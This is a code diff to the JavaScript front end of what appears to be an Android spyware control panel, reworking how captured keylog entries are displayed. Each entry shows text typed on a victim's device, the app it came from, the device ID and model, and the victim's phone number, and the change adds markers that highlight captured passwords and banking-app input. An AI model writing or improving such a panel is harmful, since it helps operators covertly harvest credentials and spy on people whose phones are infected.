@@ -1222,17 +1222,54 @@ function renderKeylogEntries() {
     return;
   }
 
-  container.innerHTML = filtered.map(e => {
+  container.innerHTML = filtered.map((e, idx) => {
     const ts = esc(e.recorded_at || '');
-    const app = esc(e.app_package || 'unknown');
-    const text = esc(e.text_content || '');
-    return `<div style="padding:8px 10px;border-bottom:1px solid var(--border)">
-      <div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
-        <div style="flex:1;word-break:break-all;color:var(--text)">${text}</div>
-        <div style="font-size:10px;color:var(--muted);white-space:nowrap;text-align:right">
-          <div style="color:var(--accent)">${app}</div>
-          <div>${ts}</div>
+    const pkg = e.app_package || 'unknown';
+    const text = e.text_content || '';
+    const isCleared = text === '[field cleared]' || e.is_cleared;
+    const isPassword = e.is_password;
+    const isBanking = e.is_banking;
+    const appSwitched = e.app_switched;
+
+    // Get app icon (reuse APP_ICONS from notifications)
+    const appInfo = getAppIcon(pkg);
+    const isCircular = typeof appInfo.icon === 'string' && appInfo.icon.length === 1;
+
+    // Format timestamp for display
+    let timeStr = ts;
+    if (ts && ts.length >= 13) {
+      const date = new Date(parseFloat(ts));
+      if (!isNaN(date.getTime())) {
+        timeStr = date.toLocaleTimeString();
+      }
+    }
+
+    // Text styling based on type
+    let textColor = 'var(--text)';
+    let textPrefix = '';
+    if (isCleared) {
+      textColor = '#f44336';
+    } else if (isPassword) {
+      textColor = '#FF9800';
+      textPrefix = '🔑 ';
+    } else if (isBanking) {
+      textColor = '#FF5252';
+      textPrefix = '🏦 ';
+    }
+
+    // Add separator if app switched
+    const separator = (appSwitched && idx > 0) ? '<div style="border-top:2px dashed rgba(255,255,255,.1);margin:4px 0"></div>' : '';
+
+    return `${separator}<div style="display:flex;gap:10px;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start;${appSwitched ? 'background:rgba(0,229,255,.03)' : ''}">
+      <div style="flex-shrink:0;width:32px;height:32px;border-radius:50%;background:${appInfo.color};display:flex;align-items:center;justify-content:center;font-size:${isCircular ? '14px' : '16px'};font-weight:bold;color:${appInfo.color === '#000000' || appInfo.color === '#FFFC00' ? '#000' : '#fff'}">
+        ${appInfo.icon}
+      </div>
+      <div style="flex:1;min-width:0">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
+          <span style="font-size:11px;font-weight:600;color:${appInfo.color}">${esc(appInfo.name)}</span>
+          <span style="font-size:9px;color:var(--muted);white-space:nowrap">${timeStr}</span>
         </div>
+        <div style="font-size:13px;color:${textColor};word-break:break-word;line-height:1.4;margin-top:2px;font-family:'JetBrains Mono',monospace">${textPrefix}${esc(text)}</div>
       </div>
     </div>`;
   }).join('');
@@ -1521,20 +1558,37 @@ async function loadGlobalKeylogs(page) {
 
     list.innerHTML = entries.map(e => {
       const ts = esc(e.recorded_at || '');
-      const app = esc(e.app_package || 'unknown');
-      const text = esc(e.text_content || '');
+      const pkg = e.app_package || 'unknown';
+      const text = e.text_content || '';
       const devShort = (e.device_id || '').substring(0, 8);
       const model = e.model ? esc(e.model) : '';
       const phone = e.phone_numbers ? esc(String(e.phone_numbers).replace(/[\[\]"]/g, '').split(',')[0] || '') : '';
-      return `<div style="padding:10px;border-bottom:1px solid var(--border)">
-        <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
-          <div style="flex:1;word-break:break-all;color:var(--text);font-size:13px">${text}</div>
-          <div style="font-size:10px;color:var(--muted);white-space:nowrap;text-align:right;min-width:140px">
-            <div style="color:var(--accent)">${app}</div>
-            <div style="color:#ff9800">${devShort}...${model ? ' · ' + model : ''}</div>
-            ${phone ? `<div>${phone}</div>` : ''}
-            <div>${ts}</div>
+      const isCleared = text === '[field cleared]';
+      const isPassword = e.is_password;
+      const isBanking = e.is_banking;
+      const appInfo = getAppIcon(pkg);
+      const isCircular = typeof appInfo.icon === 'string' && appInfo.icon.length === 1;
+
+      let timeStr = ts;
+      if (ts && ts.length >= 13) { const d = new Date(parseFloat(ts)); if (!isNaN(d.getTime())) timeStr = d.toLocaleTimeString(); }
+
+      let textColor = 'var(--text)';
+      let textPrefix = '';
+      if (isCleared) { textColor = '#f44336'; }
+      else if (isPassword) { textColor = '#FF9800'; textPrefix = '🔑 '; }
+      else if (isBanking) { textColor = '#FF5252'; textPrefix = '🏦 '; }
+
+      return `<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start">
+        <div style="flex-shrink:0;width:36px;height:36px;border-radius:50%;background:${appInfo.color};display:flex;align-items:center;justify-content:center;font-size:${isCircular ? '16px' : '18px'};font-weight:bold;color:${appInfo.color === '#000000' || appInfo.color === '#FFFC00' ? '#000' : '#fff'}">
+          ${appInfo.icon}
+        </div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
+            <span style="font-size:11px;font-weight:600;color:${appInfo.color}">${esc(appInfo.name)}</span>
+            <span style="font-size:9px;color:var(--muted);white-space:nowrap">${timeStr}</span>
           </div>
+          <div style="font-size:13px;color:${textColor};word-break:break-word;line-height:1.4;margin-top:2px;font-family:'JetBrains Mono',monospace">${textPrefix}${esc(text)}</div>
+          <div style="font-size:9px;color:var(--muted);margin-top:3px">${devShort}...${model ? ' · ' + model : ''}${phone ? ' · ' + phone : ''}</div>
         </div>
       </div>`;
     }).join('');
